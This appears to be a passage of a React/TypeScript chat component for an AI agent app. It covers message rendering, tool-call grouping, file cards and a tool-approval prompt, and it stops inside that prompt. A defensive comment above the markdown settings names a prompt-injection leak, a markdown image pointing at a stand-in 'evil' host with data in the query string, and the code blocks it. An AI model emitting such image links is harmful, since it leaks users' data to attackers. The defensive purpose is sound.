import "./chat.css";
import { type ReactNode, useEffect, useLayoutEffect, useMemo, useRef, useState } from "react";
import { ext, kindOf } from "./fileKind";
import Markdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { api, AuthError, type ConnStatus, type SkillItem } from "./api";
import { Badge, chatName, ModelPicker } from "./App";
import {
  IconArrowDown, IconArrowUp, IconBell, IconCheck, IconChevron, IconClose, IconCompact, IconCopy, IconDownload, IconEye, IconFile, IconFolder, IconMore, IconPlus, IconRefresh,
  IconStop, IconWand, IconX, fileIcon,
} from "./icons";
import type { PendingApproval, ToolCall } from "./protocol.gen";
import { canContinue, type ChatState } from "./state";
import { Mascot3D, type Mood } from "./Mascot3D";
import { IdleSimp } from "./IdleSimp";

interface Props {
  sid: string;
  created?: number;
  state: ChatState;
  conn: ConnStatus;
  onError: (e: unknown) => void;
  onToggleFiles: () => void;
  filesOpen?: boolean;
  /** Open the Files panel at this file's folder, with the file highlighted. */
  onOpenFile?: (path: string) => void;
  onPreviewFile?: (path: string) => void;
  notify: boolean;
  onToggleNotify: () => void;
  menuButton?: ReactNode;
  /** The first prompt sent from the home screen: shown at once until the server echoes it. */
  firstPrompt?: string;
}

interface Action { key: string; label: string; icon: ReactNode; title: string; onClick: () => void; pressed?: boolean; disabled?: boolean }

/** a file waiting to be sent: a picture shows itself, anything else its name; x takes it off */
function PendingFile({ file, onRemove, disabled }: { file: File; onRemove: () => void; disabled?: boolean }) {
  const url = useMemo(() => (file.type.startsWith("image/") ? URL.createObjectURL(file) : ""), [file]);
  useEffect(() => () => { if (url) URL.revokeObjectURL(url); }, [url]);
  return (
    <li className={url ? "pic" : ""} title={file.name}>
      {url ? <img src={url} alt={file.name} /> : <><IconFile size={16} /><span>{file.name}</span></>}
      <button type="button" className="ghost icon remove" aria-label={`Remove ${file.name}`} title="Remove" disabled={disabled} onClick={onRemove}><IconX size={12} /></button>
    </li>
  );
}

/** the pictures in a paste, renamed "pasted-<time>.<ext>" so they don't overwrite each other */
export function pastedImages(e: React.ClipboardEvent): File[] {
  const stamp = new Date().toISOString().slice(0, 19).replace(/[-:]/g, "").replace("T", "-");
  return [...e.clipboardData.files].filter((f) => f.type.startsWith("image/")).map((f, i, all) =>
    new File([f], `pasted-${stamp}${all.length > 1 ? `-${i + 1}` : ""}.${f.type.split("/")[1].replace("jpeg", "jpg").replace(/\+.*/, "")}`, { type: f.type }));
}

export function Chat({ sid, created, state, conn, onError, onToggleFiles, filesOpen = false, onOpenFile, onPreviewFile, notify, onToggleNotify, menuButton, firstPrompt }: Props) {
  const busy = state.runState !== "idle" && state.runState !== "error";
  // the mascot's face after a run: a happy hop when it finishes, turned aside when stopped, sad on error
  const [after, setAfter] = useState<Mood>("idle");
  const prevRun = useRef(state.runState);
  useEffect(() => {
    const prev = prevRun.current; prevRun.current = state.runState;
    if (state.runState !== "idle" || prev === "idle" || prev === "error") return setAfter("idle");
    setAfter(prev === "aborting" ? "stopped" : "done");
    const t = setTimeout(() => setAfter("idle"), prev === "aborting" ? 4000 : 2500);
    return () => clearTimeout(t);
  }, [state.runState]);
  const [cmdError, setCmdError] = useState<string>();
  useEffect(() => setCmdError(undefined), [sid]);
  // onError still sees every failure (AuthError logs out); non-auth ones are also shown above the composer.
  const fail = (e: unknown) => { onError(e); if (!(e instanceof AuthError)) setCmdError(errorText(e)); };
  const send = (c: Parameters<typeof api.command>[1]) => api.command(sid, c).then(() => setCmdError(undefined), fail);
  // Steer messages only reach state.items at the next turn boundary, so show them at once as pending bubbles.
  // A pending bubble hides once the server has echoed that text `n` times; leftovers are dropped when the run ends.
  const [steers, setSteers] = useState<{ id: number; text: string; n: number; failed?: boolean }[]>([]);
  const steerId = useRef(0);
  useEffect(() => setSteers([]), [sid]);
  useEffect(() => { if (!busy) setSteers((s) => s.filter((p) => p.failed)); }, [busy]);
  const echoed = (t: string) => state.items.filter((i) => i.kind === "user" && i.text === t).length;
  const pendingSteers = steers.filter((p) => p.failed || echoed(p.text) < p.n);
  const composerSend: Send = (c) => {
    if (c.type !== "steer") return void send(c);
    const id = ++steerId.current;
    setSteers((s) => [...s, { id, text: c.text, n: echoed(c.text) + s.filter((p) => p.text === c.text && !p.failed).length + 1 }]);
    api.command(sid, c).then(() => setCmdError(undefined), (e) => {
      fail(e);
      setSteers((s) => s.map((p) => (p.id === id ? { ...p, failed: true } : p)));
    });
  };
  const { inFlight: f } = state;
  const [spend, setSpend] = useState<Awaited<ReturnType<typeof api.usage>>>();
  useEffect(() => {  // on every run end, and every 30s so an admin pause/resume shows up while idle
    const load = () => api.usage().then(setSpend).catch(() => {});
    if (!busy) load();
    const t = setInterval(load, 30000);
    return () => clearInterval(t);
  }, [busy]);

  // Follow new output only while the user is at (or near) the bottom; otherwise offer a "scroll to bottom" button.
  const log = useRef<HTMLDivElement>(null);
  const stick = useRef(true);
  const [away, setAway] = useState(false);
  const seen = useRef(0);
  useEffect(() => { stick.current = true; setAway(false); seen.current = 0; }, [sid]);
  useLayoutEffect(() => {
    const el = log.current;
    if (!el) return;
    const n = state.items.length;
    if (n > seen.current && state.items[n - 1]?.kind === "user") stick.current = true;  // the user just sent something
    seen.current = n;
    if (stick.current) el.scrollTop = el.scrollHeight;
  }, [sid, state.items, f.text, f.thinking, state.toolOutputs, state.results, state.pending, steers]);
  const onScroll = () => {
    const el = log.current!;
    const near = el.scrollHeight - el.scrollTop - el.clientHeight < 80;
    stick.current = near;
    setAway(!near);
  };
  const toBottom = () => {
    const el = log.current!;
    stick.current = true;
    el.scrollTo({ top: el.scrollHeight, behavior: reducedMotion() ? "auto" : "smooth" });
  };

  const pendingShown = state.items.some((i) => i.kind === "assistant" && i.msg.tool_calls.some((c) => c.id === state.pending?.call_id));
  const actions: Action[] = [
    { key: "compact", label: "Compact", icon: <IconCompact size={16} />, disabled: busy,
      title: "Summarize older messages to free context", onClick: () => send({ type: "compact" }) },
    { key: "notify", label: "Notify when hidden", icon: <IconBell size={16} />, pressed: notify,
      title: "Notify me when this tab is hidden", onClick: onToggleNotify },
    { key: "files", label: "Files", icon: <IconFolder size={16} />, title: "Show files", pressed: filesOpen, onClick: onToggleFiles },
  ];

  // One "Thinking" per turn (everything between two user messages), not one per model call:
  // the turn's first assistant message shows all its thoughts, the later ones none.
  const turnOf = new Map<number, number>(), thoughts = new Map<number, string[]>();
  let turn = 0;
  for (const it of state.items) {
    if (it.kind === "user") turn = it.seq;
    else if (it.kind === "assistant") {
      if (!thoughts.has(turn)) { thoughts.set(turn, []); turnOf.set(it.seq, turn); }
      if (it.msg.thinking.trim()) thoughts.get(turn)!.push(it.msg.thinking);
    }
  }
  const liveTurnHasItems = thoughts.has(turn);
  // Tool calls in a row (across the model's steps, until it writes text again) form one group,
  // so 20 page opens are one line ("Searched the web 2 times, opened 18 pages") instead of 20.
  const groupCalls = new Map<number, ToolCall[]>(), absorbed = new Set<number>();
  let owner: number | null = null;
  for (const it of state.items) {
    if (it.kind !== "assistant") { owner = null; continue; }
    const calls = it.msg.tool_calls;
    if (owner !== null && !it.msg.text && !it.msg.error) { groupCalls.get(owner)!.push(...calls); absorbed.add(it.seq); }
    else { groupCalls.set(it.seq, [...calls]); owner = calls.length ? it.seq : null; }
  }
  // the latest answer gets its actions shown (not only on hover), plus "try again" with the last question
  const lastUserItem = [...state.items].reverse().find((i) => i.kind === "user");
  const lastUser = lastUserItem?.kind === "user" ? lastUserItem.text : "";
  const lastAnswer = [...state.items].reverse().find((i) => i.kind === "assistant")?.seq;
  if (f.thinking.trim()) (thoughts.get(turn) ?? (thoughts.set(turn, []), thoughts.get(turn)!)).push(f.thinking);
  const thinkingNow = busy && !!f.thinking && !f.text;
  const thinkMs = useThinkTime(`${sid}:${turn}`, thinkingNow);
  const turnThinking = (t: number, live: boolean) => {
    const all = thoughts.get(t) ?? [];
    return all.length > 0 && <Thinking text={all.join("\n\n")} live={live && thinkingNow} ms={thinkMs(t === turn ? `${sid}:${turn}` : `${sid}:${t}`)} />;
  };

  return (
    <main className="chat">
      <header>
        {menuButton}
        <strong className="title">{chatName({ title: state.title, created })}</strong>
        <Badge state={state.runState} />
        {conn !== "live" && <span className={`conn ${conn}`} role="status">{conn === "reconnecting" ? "reconnecting…" : "connecting…"}</span>}
        {spend?.paused && <span className="pill warn small">Paused</span>}
        {spend && <span className="spend">${spend.today_usd.toFixed(2)} today</span>}
        <span className="spacer" />
        <MoreMenu actions={actions} />
      </header>
      <div className="chat-body">
        <div className="messages" ref={log} onScroll={onScroll} role="log" aria-live="polite" aria-label="Conversation">
          <div className="thread">
            {state.items.map((it) =>
              it.kind === "user" ? <UserMsg key={it.seq} text={it.text} sid={sid} onPreview={onPreviewFile} onError={onError} />
              : it.kind === "notice" ? (it.text === "run aborted" ? null  // shown as "Stopped" under the answer
                : <div key={it.seq} className={`notice ${it.level}`}>{it.text}</div>)
              : absorbed.has(it.seq) ? null  // its tool calls are shown in the group above
              : (
                <div key={it.seq} className="msg assistant">
                  {turnOf.has(it.seq) && turnThinking(turnOf.get(it.seq)!, turnOf.get(it.seq) === turn)}
                  {it.msg.text && <Md text={it.msg.text} onFile={onPreviewFile} />}
                  {it.msg.error && it.msg.error !== "aborted" && <div className="notice error">{it.msg.error}</div>}
                  {(groupCalls.get(it.seq)?.length ?? 0) > 0 &&
                    <ToolGroup calls={groupCalls.get(it.seq)!} state={state} send={send} sid={sid} onOpenFile={onOpenFile} onPreviewFile={onPreviewFile} onError={onError} />}
                  {/* copy only the answer, not an in-between step that called tools (its button landed under the tool) */}
                  {((it.msg.text && it.msg.tool_calls.length === 0) || it.msg.error === "aborted") && (
                    <div className={`msg-actions ${it.seq === lastAnswer || it.msg.error === "aborted" ? "last" : ""}`}>
                      {/* you pressed Stop: one quiet word where the answer ends, not a red error plus a banner */}
                      {it.msg.error === "aborted" && <span className="stopped">Stopped</span>}
                      {it.msg.text && <CopyButton label="Copy answer" text={() => it.msg.text} />}
                      {it.seq === lastAnswer && !busy && lastUser && (
                        <button type="button" className="icon-btn" aria-label="Try again" title="Ask again"
                          onClick={() => send({ type: "prompt", text: lastUser, images: [], skills: [], effort: savedEffort() })}><IconRefresh size={16} /></button>
                      )}
                    </div>
                  )}
                </div>
              ))}
            {/* aria-live off + aria-busy: don't announce every streamed token; the finished message is announced once */}
            {firstPrompt && !state.items.some((i) => i.kind === "user") && <UserMsg text={firstPrompt} sid={sid} onError={onError} plain />}
            {(f.text || (f.thinking && !liveTurnHasItems)) && (
              <div className="msg assistant streaming" aria-live="off" aria-busy="true">
                {!liveTurnHasItems && turnThinking(turn, true)}
                {f.text && <Md text={f.text} />}
              </div>
            )}
            {busy || (!!firstPrompt && !state.items.some((i) => i.kind === "user")) ? <RunStatus sid={sid} started={state.runStarted} asking={state.runState === "waiting_approval"} />
              : <div className="msg assistant idle-mascot" aria-hidden><Mascot3D size={32} pixels={48} mood={state.runState === "error" ? "error" : after} /></div>}
            {pendingSteers.map((p) => (
              <div key={`steer-${p.id}`} className={`msg user pending ${p.failed ? "failed" : ""}`}>
                {p.text}<span className="msg-status">{p.failed ? "Not sent" : "Queued"}</span>
              </div>
            ))}
            {state.pending && !pendingShown && <Approval p={state.pending} send={send} />}
            {canContinue(state) && (
              <div className="row"><button className="primary" onClick={() => send({ type: "continue" })}>Continue</button></div>
            )}
          </div>
        </div>
        {away && (
          <button className="to-bottom" aria-label="Scroll to bottom" title="Scroll to bottom" onClick={toBottom}>
            <IconArrowDown size={16} />
          </button>
        )}
      </div>
      {cmdError && <div className="notice error cmd-error" role="alert">{cmdError}</div>}
      <Composer busy={busy} send={composerSend} sid={sid} onError={onError} idle />
    </main>
  );
}

const reducedMotion = () => typeof matchMedia === "function" && matchMedia("(prefers-reduced-motion: reduce)").matches;

/** Session actions (Compact, Notify, Files) behind the header's "⋯" button, on every screen size. */
function MoreMenu({ actions }: { actions: Action[] }) {
  const [open, setOpen] = useState(false);
  const root = useRef<HTMLDivElement>(null);
  const trigger = useRef<HTMLButtonElement>(null);
  const items = () => [...(root.current?.querySelectorAll<HTMLButtonElement>("[role^=menuitem]") ?? [])];
  useEffect(() => {
    if (!open) return;
    items()[0]?.focus();
    const away = (e: PointerEvent) => { if (!root.current?.contains(e.target as Node)) setOpen(false); };
    document.addEventListener("pointerdown", away);
    return () => document.removeEventListener("pointerdown", away);
  }, [open]);
  const close = () => { setOpen(false); trigger.current?.focus(); };
  const onKey = (e: React.KeyboardEvent) => {
    if (e.key === "Escape") { e.stopPropagation(); close(); return; }
    if (e.key !== "ArrowDown" && e.key !== "ArrowUp" && e.key !== "Home" && e.key !== "End") return;
    e.preventDefault();
    const list = items();
    const i = list.indexOf(document.activeElement as HTMLButtonElement);
    const next = e.key === "Home" ? 0 : e.key === "End" ? list.length - 1
      : (i + (e.key === "ArrowDown" ? 1 : -1) + list.length) % list.length;
    list[next]?.focus();
  };
  return (
    <div className="more" ref={root} onKeyDown={onKey}
      onBlur={(e) => { if (open && !root.current?.contains(e.relatedTarget as Node)) setOpen(false); }}>
      <button ref={trigger} className="hbtn" aria-label="More" title="More" aria-haspopup="menu" aria-expanded={open}
        onClick={() => setOpen(!open)}>
        <IconMore size={16} />
      </button>
      {open && (
        <div className="menu" role="menu" aria-label="Session actions">
          {actions.map((a) => (
            <button key={a.key} role={a.pressed === undefined ? "menuitem" : "menuitemcheckbox"} aria-checked={a.pressed}
              aria-disabled={a.disabled || undefined} title={a.title} tabIndex={-1}
              onClick={() => { if (a.disabled) return; a.onClick(); close(); }}>
              {a.icon}<span>{a.label}</span>
              {a.pressed && <IconCheck size={16} className="check" />}
            </button>
          ))}
        </div>
      )}
    </div>
  );
}

function useCopy(): [boolean, (t: string) => void] {
  const [done, setDone] = useState(false);
  const timer = useRef<number>(undefined);
  useEffect(() => () => clearTimeout(timer.current), []);
  const copy = (t: string) => navigator.clipboard?.writeText(t).then(() => {
    setDone(true);
    clearTimeout(timer.current);
    timer.current = window.setTimeout(() => setDone(false), 1500);
  }, () => {});
  return [done, copy];
}

function CopyButton({ text, label = "Copy", className = "icon-btn" }: { text: () => string; label?: string; className?: string }) {
  const [done, copy] = useCopy();
  return (
    <button type="button" className={className} aria-label={done ? "Copied" : label} title={done ? "Copied" : label}
      onClick={() => copy(text())}>
      {done ? <IconCheck size={16} /> : <IconCopy size={16} />}
    </button>
  );
}

function CodeBlock({ children }: { children?: ReactNode }) {
  const pre = useRef<HTMLPreElement>(null);
  return (
    <div className="code-block">
      <pre ref={pre}>{children}</pre>
      <CopyButton text={() => pre.current?.textContent ?? ""} label="Copy code" className="icon-btn code-copy" />
    </div>
  );
}

// Images are never loaded: a prompt-injected model could leak data via ![](https://evil/?d=...). javascript: URLs are
// dropped by react-markdown's default urlTransform.
const mdComponents: Components = {
  img: ({ src, alt }) => <a href={typeof src === "string" ? src : undefined} target="_blank" rel="noopener noreferrer">[image: {alt}] {src}</a>,
  a: ({ href, children }) => <a href={href} target="_blank" rel="noopener noreferrer">{children}</a>,
  pre: ({ children }) => <CodeBlock>{children}</CodeBlock>,
};
const OTHER_FILES = new Set(["pptx", "ppt", "doc", "xls", "zip", "odt", "ods", "mp3", "mp4", "wav"]);
/** `report.docx` or `/work/a/b.py` in an answer: a workspace file name (one line, has an extension) */
export const fileRef = (t: string) => {
  const p = t.trim().replace(/^\/work\//, "");
  const known = kindOf(p) !== "info" || OTHER_FILES.has(ext(p));  // `os.path`, `np.array` are code, not files
  return known && /^[^\s/][^\n<>|*?"]*\.[A-Za-z][A-Za-z0-9]{0,4}$/.test(p) && !/^[a-z]+:\/\//i.test(p) && !p.split("/").includes("..") ? p : undefined;
};
export const Md = ({ text, onFile }: { text: string; onFile?: (path: string) => void }) => {
  // with onFile, inline code that names a file becomes a button that opens the preview (a missing file says so there)
  const components = useMemo<Components>(() => !onFile ? mdComponents : {
    ...mdComponents,
    code: ({ className, children }) => {
      const t = String(children), p = !className && !t.includes("\n") ? fileRef(t) : undefined;
      return p ? <button className="file-ref" onClick={() => onFile(p)} title={`Preview ${p}`}>{(() => { const I = fileIcon(p, kindOf(p)); return <I size={14} />; })()}<span>{children}</span></button>
        : <code className={className}>{children}</code>;
    },
  }, [onFile]);
  return <div className="md"><Markdown remarkPlugins={[remarkGfm]} components={components}>{text}</Markdown></div>;
};

/** "Thinking…" while the model thinks, then "Thought for 4s" (or "Thoughts" when the time isn't known, e.g. after a reload). */
function Thinking({ text, live = false, ms }: { text: string; live?: boolean; ms?: number }) {
  const label = live ? "Thinking…" : ms && ms >= 1000 ? `Thought for ${fmtDuration(ms)}` : "Thoughts";
  return (
    <details className={`thinking ${live ? "live" : ""}`}>
      <summary><IconChevron size={16} className="chev" /><span className="think-label">{label}</span></summary>
      <div>{text}</div>
    </details>
  );
}

// Time spent thinking per turn, measured in this tab (it adds up over the turn's model calls).
const thinkTimes = new Map<string, { ms: number; since?: number }>();
function useThinkTime(key: string, thinking: boolean) {
  const now = useNow(thinking);
  let t = thinkTimes.get(key);
  if (thinking) { if (!t) thinkTimes.set(key, (t = { ms: 0 })); if (t.since === undefined) t.since = now; }
  else if (t?.since !== undefined) { t.ms += now - t.since; t.since = undefined; }
  return (k: string) => { const x = thinkTimes.get(k); return x ? x.ms + (x.since !== undefined ? now - x.since : 0) : undefined; };
}

export type Send = (c: Parameters<typeof api.command>[1]) => void;

/** Tools that write a file; their `path` argument names it (see simp_agent/coding/tools.py). */
const FILE_TOOLS = new Set(["write", "edit"]);

/** The file a tool call wrote, once its result came back without error; otherwise undefined. */
export function writtenFile(call: ToolCall, result?: { is_error: boolean }): string | undefined {
  const path = call.arguments.path;
  // only /work is the user's (the Files panel and preview read it); /tmp etc. live in the sandbox alone: no card
  const outside = typeof path === "string" && path.startsWith("/") && path !== "/work" && !path.startsWith("/work/");
  return FILE_TOOLS.has(call.name) && result && !result.is_error && typeof path === "string" && path && !outside ? path : undefined;
}

export async function downloadFile(sid: string, path: string) {
  const url = URL.createObjectURL(await api.download(sid, path));
  Object.assign(document.createElement("a"), { href: url, download: path.split("/").pop() || path }).click();
  URL.revokeObjectURL(url);
}

const ATTACHED = /\s*\[Attached files in the workspace: ([^\]]+)\]\s*$/;
const isPic = (n: string) => /\.(png|jpe?g|webp|gif)$/i.test(n);

/** A user's message: its text, and the files sent with it as cards (pictures as thumbnails); a click previews. */
function UserMsg({ text, sid, onPreview, onError, plain }: { text: string; sid: string; onPreview?: (p: string) => void; onError: (e: unknown) => void; plain?: boolean }) {
  const m = text.match(ATTACHED), body = m ? text.slice(0, m.index) : text;
  const files = m ? m[1].split(", ").filter(Boolean) : [];
  return (
    <div className="msg user">
      {files.length > 0 && (
        <ul className="sent-files" aria-label="Sent files">
          {files.map((f) => (
            <li key={f}>
              <button type="button" className={`ghost ${isPic(f) ? "pic" : "doc"}`} title={f} aria-label={`Preview ${f}`}
                disabled={!onPreview} onClick={() => onPreview?.(f)}>
                {isPic(f) ? <SentPic path={f} sid={sid} onError={onError} /> : <><IconFile size={16} /><span>{f}</span></>}
              </button>
            </li>
          ))}
        </ul>
      )}
      {body && (plain ? body : <Md text={body} />)}
    </div>
  );
}

/** a sent picture, loaded from the workspace (the files API needs the auth header, so through a blob URL) */
function SentPic({ path, sid, onError }: { path: string; sid: string; onError: (e: unknown) => void }) {
  const [url, setUrl] = useState("");
  useEffect(() => {
    let u = "", live = true;
    api.download(sid, path).then((b) => { u = URL.createObjectURL(b); if (live) setUrl(u); }).catch(() => { /* gone: show the name */ });
    return () => { live = false; if (u) URL.revokeObjectURL(u); };
  }, [sid, path]);
  return url ? <img src={url} alt={path} /> : <span className="sent-pic-wait">{path}</span>;
}

function FileCard({ path, sid, onOpen, onPreview, onError }: { path: string; sid: string; onOpen?: (p: string) => void; onPreview?: (p: string) => void; onError: (e: unknown) => void }) {
  return (
    <div className="file-card">
      <IconFile size={16} />
      <span className="file-path" title={path}>{path}</span>
      {onPreview && <button type="button" className="hbtn" aria-label={`Preview ${path}`} onClick={() => onPreview(path)}>
        <IconEye size={16} /><span>Preview</span></button>}
      {onOpen && <button type="button" className="hbtn" aria-label={`Open ${path} in Files`} onClick={() => onOpen(path)}>
        <IconFolder size={16} /><span>Open</span></button>}
      <button type="button" className="hbtn" aria-label={`Download ${path}`}
        onClick={() => downloadFile(sid, path).catch(onError)}><IconDownload size={16} /><span>Download</span></button>
    </div>
  );
}

type ToolProps = { state: ChatState; send: Send; sid: string; onOpenFile?: (p: string) => void; onPreviewFile?: (p: string) => void; onError: (e: unknown) => void };

/** A few calls show as rows; more fold into one summary line. Calls still running or waiting for you stay visible. */
function ToolGroup({ calls: all, ...p }: ToolProps & { calls: ToolCall[] }) {
  // link cards are part of the answer: never folded into the summary line
  const cards = all.filter((c) => c.name === "show_cards"), calls = all.filter((c) => c.name !== "show_cards");
  const cardEls = cards.map((c) => <Tool key={c.id} call={c} {...p} />);
  if (!calls.length) return <>{cardEls}</>;
  const finished = calls.filter((c) => p.state.results[c.id]);
  const active = calls.filter((c) => !p.state.results[c.id]);
  if (calls.length <= 3 || finished.length <= 1) return <>{calls.map((c) => <Tool key={c.id} call={c} {...p} />)}{cardEls}</>;
  const failed = finished.filter((c) => p.state.results[c.id].is_error).length;
  return (
    <>
      <details className="tool tool-group">
        <summary>
          <span className={`tstat ${failed ? "error" : "done"}`} role="img" aria-label={failed ? `${failed} failed` : "done"}>
            {failed ? <IconClose size={14} strokeWidth={2.5} /> : <IconCheck size={14} strokeWidth={2.5} />}
          </span>
          <span className="tool-label">{groupSummary(finished)}{failed > 0 && `, ${failed} failed`}</span>
          <IconChevron size={16} className="chev" />
        </summary>
        <div className="tool-group-body">{finished.map((c) => <Tool key={c.id} call={c} {...p} />)}</div>
      </details>
      {active.map((c) => <Tool key={c.id} call={c} {...p} />)}
      {cardEls}
    </>
  );
}

/** "Searched the web 2 times, opened 18 pages" */
export function groupSummary(calls: ToolCall[]): string {
  const n = new Map<string, number>();
  for (const c of calls) { const k = mcpLabel(c.name) ? `app:${mcpLabel(c.name)!.split(" · ")[0]}` : c.name; n.set(k, (n.get(k) ?? 0) + 1); }
  const pl = (k: number, one: string, many = one + "s") => `${k} ${k === 1 ? one : many}`;
  const parts = [...n].map(([name, k]) => {
    const app = name.startsWith("app:") ? name.slice(4) : undefined;
    if (app) return `used ${app} ${k === 1 ? "once" : `${k} times`}`;
    switch (name) {
      case "web_search": return k === 1 ? "searched the web" : `searched the web ${k} times`;
      case "web_fetch": return `opened ${pl(k, "page")}`;
      case "read": return `read ${pl(k, "file")}`;
      case "write": return `wrote ${pl(k, "file")}`;
      case "edit": return `edited ${pl(k, "file")}`;
      case "bash": return `ran ${pl(k, "command")}`;
      case "grep": case "find": case "ls": return `looked through files ${k === 1 ? "once" : `${k} times`}`;
      default: return `used ${name.replace(/[_-]+/g, " ")} ${k === 1 ? "once" : `${k} times`}`;
    }
  });
  const out = parts.join(", ");
  return out.charAt(0).toUpperCase() + out.slice(1);
}

function Tool({ call, state, send, sid, onOpenFile, onPreviewFile, onError }: {
  call: ToolCall; state: ChatState; send: Send; sid: string; onOpenFile?: (p: string) => void; onPreviewFile?: (p: string) => void; onError: (e: unknown) => void;
}) {
  const result = state.results[call.id];
  const output = result?.content ?? state.toolOutputs[call.id];
  const decision = state.decisions[call.id];
  const file = writtenFile(call, result);
  const status = result ? (result.is_error ? "error" : "done") : state.pending?.call_id === call.id ? "approval" : "running";
  const ms = useToolTimer(call.id, !result);
  const cards = call.name === "show_cards" && result && !result.is_error ? parseCards(result.content) : [];
  if (cards.length) return <LinkCards cards={cards} />;
  return (
    <>
    <details className={`tool ${status}`}>
      <summary>
        <span className={`tstat ${status}`} title={dotLabel[status]} role="img" aria-label={dotLabel[status]}>
          {status === "done" ? <IconCheck size={14} strokeWidth={2.5} /> : status === "error" ? <IconClose size={14} strokeWidth={2.5} /> : status === "approval" ? "?" : null}
        </span>
        <span className="tool-label">{withCode(toolLabel(call, status !== "running" && status !== "approval"))}</span>
        {ms !== null && ms >= 1000 && <span className="tool-time" aria-label={`ran for ${fmtDuration(ms)}`}>{fmtDuration(ms)}</span>}
        <IconChevron size={16} className="chev" />
      </summary>
      <div className="tool-body">
        {decision && decision !== "allow" && <p className="small muted">Decision: {decision}</p>}
        {output && <pre className={`output ${result?.is_error ? "err" : ""}`}>{output}</pre>}
      </div>
    </details>
    {/* the question stands on its own under the row, not nested in the tool's output */}
    {state.pending?.call_id === call.id && <Approval p={state.pending} send={send} />}
    {result?.is_error && output && <p className="tool-err small">{oneLine(output)}</p>}
    {file && <FileCard path={file} sid={sid} onOpen={onOpenFile} onPreview={onPreviewFile} onError={onError} />}
    </>
  );
}

export type LinkCard = { url: string; title: string; snippet: string; image: string };

/** show_cards result (JSON {"cards": [...]}) -> cards with http(s) links; [] if it is not that. */
export function parseCards(content: string): LinkCard[] {
  try {
    const raw = JSON.parse(content)?.cards;
    const http = (u: unknown) => (typeof u === "string" && /^https?:\/\//.test(u) ? u : "");
    return Array.isArray(raw) ? raw.filter((c) => http(c?.url)).map((c) => ({
      url: c.url, title: String(c.title ?? ""), snippet: String(c.snippet ?? ""), image: http(c.image),
    })) : [];
  } catch { return []; }
}

const host = (u: string) => { try { return new URL(u).hostname.replace(/^www\./, ""); } catch { return u; } };

function LinkCards({ cards }: { cards: LinkCard[] }) {
  return (
    <div className="link-cards">
      {cards.map((c, i) => (
        <a key={i} className="link-card" href={c.url} target="_blank" rel="noopener noreferrer" title={c.title}>
          {c.image && <img className="link-card-img" src={c.image} alt="" loading="lazy" referrerPolicy="no-referrer"
            onError={(e) => e.currentTarget.remove()} />}
          <span className="link-card-title">{c.title || host(c.url)}</span>
          {c.snippet && <span className="link-card-snippet">{c.snippet}</span>}
          <span className="link-card-host">
            <img src={`https://www.google.com/s2/favicons?domain=${host(c.url)}&sz=32`} alt="" width={14} height={14} loading="lazy" />
            {host(c.url)}
          </span>
        </a>
      ))}
    </div>
  );
}

/** "Ran `npm test`" -> Ran <code>npm test</code> (the label marks commands with backticks). */
const withCode = (label: string) =>
  label.split(/`([^`]*)`/).map((part, i) => (i % 2 ? <code key={i} className="tool-code">{part}</code> : part));

const dotLabel = { running: "running", done: "done", error: "error", approval: "needs approval" } as const;

/** "409 {\"detail\":\"...\"}" (from api.call) -> the server's detail text when there is one. */
export function errorText(e: unknown): string {
  const m = e instanceof Error ? e.message : String(e);
  const i = m.indexOf(" ");
  try {
    const d = JSON.parse(m.slice(i + 1)).detail;
    if (typeof d === "string") return d;
  } catch { /* not JSON */ }
  return m;
}

const oneLine = (s: string, max = 80) => {
  const l = s.trim().split("\n")[0];
  return l.length > max ? l.slice(0, max - 1) + "…" : l;
};

/** One plain line for a tool call, e.g. "Read src/app.py" or "Ran `npm test`"; never the raw arguments. */
export function toolLabel(call: ToolCall, finished: boolean): string {
  if (mcpLabel(call.name)) return mcpLabel(call.name)!;
  const a = call.arguments;
  const str = (k: string) => (typeof a[k] === "string" ? oneLine(a[k] as string) : "");
  const verb = (done: string, ing: string) => (finished ? done : ing);
  switch (call.name) {
    case "read": return `${verb("Read", "Reading")} ${str("path")}`;
    case "write": return `${verb("Wrote", "Writing")} ${str("path")}`;
    case "edit": return `${verb("Edited", "Editing")} ${str("path")}`;
    case "bash": return `${verb("Ran", "Running")} \`${str("command")}\``;
    case "grep": return `${verb("Searched", "Searching")} for ${str("pattern")}`;
    case "find": return `${verb("Found", "Finding")} files ${str("pattern")}`;
    case "ls": return `${verb("Listed", "Listing")} ${str("path") || "files"}`;
    case "web_search": return `${verb("Searched", "Searching")} the web: ${str("query") || str("q")}`;
    case "web_fetch": {
      try { return `${verb("Opened", "Opening")} ${new URL(str("url")).hostname}`; } catch { return verb("Opened a page", "Opening a page"); }
    }
    default: { const n = call.name.replace(/[_-]+/g, " "); return n.charAt(0).toUpperCase() + n.slice(1); }
  }
}

const APP_NAMES: Record<string, string> = { gmail: "Gmail", drive: "Drive", calendar: "Calendar", github: "GitHub", deepwiki: "DeepWiki", context7: "Context7",
  mslearn: "Microsoft Learn", cfdocs: "Cloudflare Docs", awsknowledge: "AWS Knowledge" };
const words = (s: string) => s.replace(/[_-]+/g, " ").trim();
/** MCP tools are named "<server>__<tool>": "gmail__create_draft" -> "Gmail · create draft". Undefined for built-in tools. */
export function mcpLabel(name: string): string | undefined {
  const i = name.indexOf("__");
  if (i <= 0) return;
  const app = name.slice(0, i).toLowerCase();
  const n = APP_NAMES[app] ?? words(app).replace(/^./, (c) => c.toUpperCase());
  return `${n} · ${words(name.slice(i + 2))}`;
}
/** Args as short "key: value" lines (long values cut) instead of raw JSON. */
/** What the approval box asks, in plain words: the command or file instead of raw JSON arguments. */
export function approvalAsk(tool: string, args: Record<string, unknown>): { question: string; code?: string; lines: string[] } {
  const str = (k: string) => (typeof args[k] === "string" ? (args[k] as string) : "");
  const mcp = mcpLabel(tool);
  if (mcp) return { question: `Allow ${mcp}?`, lines: argLines(args) };
  switch (tool) {
    case "bash": return { question: "Run this command?", code: str("command"), lines: [] };
    case "write": return { question: `Write ${str("path")}?`, code: str("content").slice(0, 2000), lines: [] };
    case "edit": return { question: `Edit ${str("path")}?`, lines: [] };
    case "read": return { question: `Read ${str("path")}?`, lines: [] };
    default: return { question: `Allow ${tool}?`, lines: argLines(args) };
  }
}

export const argLines = (args: Record<string, unknown>) => Object.entries(args).map(([k, v]) =>
  `${words(k)}: ${oneLine(typeof v === "string" ? v : JSON.stringify(v), 120)}`);

function Approval({ p, send }: { p: PendingApproval; send: Send }) {
  const answer = (decision: "allow" | "deny" | "always") => send({ type: "approve", call_id: p.call_id, decision });
  // No autoFocus on Allow: an Enter meant for the composer would approve the tool. We focus the card itself (a
  // non-actionable element, so a stray Enter does nothing) and only when the user isn't typing somewhere.
